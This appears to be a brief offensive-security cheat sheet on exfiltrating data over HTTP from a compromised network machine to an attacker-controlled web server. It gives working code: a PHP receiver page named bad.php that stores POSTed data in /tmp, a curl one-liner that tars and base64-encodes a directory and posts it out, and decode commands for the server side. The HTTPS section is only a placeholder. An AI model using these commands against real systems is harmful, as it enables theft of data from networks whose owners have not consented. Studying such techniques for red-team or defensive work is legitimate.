# Data Exfiltration Over HTTP and HTTPS

Real world scenario is that an attacker controls a cloud web server an agent or command is then executed from inside the network with a compromised machine to send the data to the webserver that is outside the compromised network. Then the attacker can just log in to a web server to get the data.



## HTTP

1.  An attacker create a page to be a data handler on the web server.
2.  A C2 agent or an attacker sends the data. 
3.  The webserver receives and stores the data.
4.  Login to webserver and get the data.

#### PHP version:#
bad.php contains:
```php
<?php 
if (isset($_POST['file'])) {
        $file = fopen("/tmp/http.bs64","w");
        fwrite($file, $_POST['file']);
        fclose($file);
   }
?>
```

Then from the machine containing the data to be exfiltrated

```bash
curl --data "file=$(tar zcf - <directory> | base64)" http://webserver/bad.php
```

From the webserver

```bash
sed -i 's/ /+/g' /tmp/http.bs64
cat /tmp/http.bs64 | base64 -d | tar xvfz -
```

## HTTPS 

Incoming later today.


## Notes
The 'Black Hat Python Ed.2' book contains a API exfiltration script to pastebin from a Windows Machine


## References